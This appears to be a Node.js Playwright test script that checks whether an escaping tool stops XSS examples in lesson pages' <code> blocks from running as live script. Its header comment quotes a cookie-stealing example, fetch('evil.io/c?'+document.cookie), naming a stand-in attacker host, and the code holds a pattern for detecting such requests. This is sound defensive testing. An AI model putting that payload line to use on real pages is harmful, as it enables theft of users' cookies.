// ─────────────────────────────────────────────────────────────────────────────
//  DOES THE PAGE STILL PHONE HOME? Only a browser can answer that.
//
//  The generator reasons about bytes with its own regex model of HTML parsing.
//  That model is not the authority; Chromium is. This loads the live body and
//  the escaped body and compares what the browser actually builds.
//
//  AN EARLIER VERSION OF THIS CHECK WAS HOLLOW, and the way it was hollow is
//  worth keeping. It asserted that the live body attempts a request to evil.io
//  or evil.com and the escaped body attempts none. It reported 0 to 0 on every
//  page, because those payloads are written
//
//      fetch('evil.io/c?'+document.cookie)
//
//  with no scheme and no leading slash. That is a RELATIVE path. On the live
//  site it resolves to https://www.apcsexamprep.com/pages/evil.io/c?<cookies>,
//  the site's own server, not to evil.io. So the assertion could never fire and
//  the severity I had reported was wrong: no data leaves the site, it lands in
//  apcsexamprep.com's own 404 log.
//
//  What IS real, and what this asserts now:
//
//    no <script> ELEMENT may remain inside a <code> block. That is directly
//    observable in the DOM, it is exactly what the escape does, and it is what
//    stops document.write(document.cookie) rewriting the lesson.
//    the escaped body throws fewer errors, never more
//    the escaped body SHOWS the example as text, which is the whole point
//
//  Run: node scripts/verify-cyber-xss-escape.js
//  No em-dashes, per repo convention.
// ─────────────────────────────────────────────────────────────────────────────
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');

const CHROME = process.env.CHROMIUM_PATH || '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';
const BAD = /evil\.io|evil\.com/i;

async function load(browser, html) {
  const tmp = path.join(os.tmpdir(), 'xss-' + process.pid + '-' + Math.random().toString(36).slice(2) + '.html');
  fs.writeFileSync(tmp, html);
  const page = await browser.newPage();
  const errors = [];
  const requests = [];
  page.on('pageerror', (e) => errors.push(e.message.split('\n')[0]));
  await page.route('**/*', (r) => {
    const u = r.request().url();
    if (!u.startsWith('file:')) requests.push(u);
    return u.startsWith('file:') ? r.continue() : r.abort();
  });
  await page.goto('file://' + tmp, { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForTimeout(2500);
  const probe = await page.evaluate(() => ({
    text: document.body.innerText || '',
    //  A <script> the browser BUILT inside a <code> is an example it is running
    //  rather than showing. This is the number the escape must drive to zero.
    scriptsInCode: document.querySelectorAll('code script, pre script').length,
  }));
  const shown = probe.text;
  await page.close();
  try { fs.unlinkSync(tmp); } catch (e) { /* best effort */ }
  return {
    errors: errors.filter((e) => !/dynamically imported module|Failed to fetch dynamically/.test(e)),
    offsite: requests.filter((u) => BAD.test(u)),
    scriptsInCode: probe.scriptsInCode,
    showsExample: /<script>/.test(shown),
  };
}

(async () => {
  const { chromium } = require(path.join(__dirname, '..', 'smoke', 'node_modules', 'playwright'));
  const m = require('./cyber-xss-example-escape');
  const { extract } = require('./extract-live-body');

  const DIR = process.env.CYBER_BODIES || '/tmp/fix';
  const browser = await chromium.launch({ executablePath: CHROME });
  const problems = [];
  let fixedPages = 0, blockedTotal = 0, held = 0;
  console.log('');

  for (const h of m.HANDLES) {
    const src = path.join(DIR, h + '.html');
    if (!fs.existsSync(src)) { console.log('  skip ' + h + ' (no saved body at ' + src + ')'); continue; }
    const body = extract(fs.readFileSync(src, 'utf8'));
    const r = m.repair(h, body);
    if (r.skip) { console.log('  skip ' + h.padEnd(38) + r.skip.slice(0, 46)); continue; }
    //  A page the generator HELD is not a failure of this check: it is a page
    //  that never reaches the sheet, and the generator already named why.
    if (r.problems && r.problems.length) { console.log('  hold ' + h.padEnd(38)
      + r.problems.join('; ').slice(0, 60)); held++; continue; }

    const before = await load(browser, body);
    const after = await load(browser, r.after);
    console.log('  ' + h);
    console.log('     <script> ELEMENTS built inside <code>  ' + before.scriptsInCode
      + ' -> ' + after.scriptsInCode);
    console.log('     page errors       ' + before.errors.length + ' -> ' + after.errors.length);
    console.log('     shows <script> as text  ' + before.showsExample + ' -> ' + after.showsExample);

    if (before.scriptsInCode === 0) {
      problems.push(h + ' built no <script> inside a <code> even before the escape, '
        + 'so this page was not showing the defect and the check proves nothing');
    }
    if (after.scriptsInCode !== 0) {
      problems.push(h + ' still builds ' + after.scriptsInCode + ' <script> element(s) inside a <code>');
    }
    if (after.offsite.length) problems.push(h + ' still attempts ' + after.offsite.join(', '));
    if (after.errors.length > before.errors.length) {
      problems.push(h + ' throws MORE after the escape: ' + before.errors.length + ' -> ' + after.errors.length);
    }
    if (!after.showsExample) problems.push(h + ' does not display the example as text after the escape');
    blockedTotal += before.scriptsInCode;
    fixedPages++;
  }
  await browser.close();

  console.log('');
  if (problems.length) {
    problems.forEach((p) => console.error('  FAIL ' + p));
    process.exit(1);
  }
  if (!fixedPages) { console.error('  no page was checked, so this proved nothing'); process.exit(1); }
  console.log('XSS ESCAPE VERIFIED: ' + fixedPages + ' pages, ' + blockedTotal
    + ' script element(s) the browser was BUILDING inside a <code> now render as text'
    + (held ? ', ' + held + ' page(s) held for a human' : ''));
})().catch((e) => { console.error('DRIVER FAILED: ' + e.message); process.exit(1); });
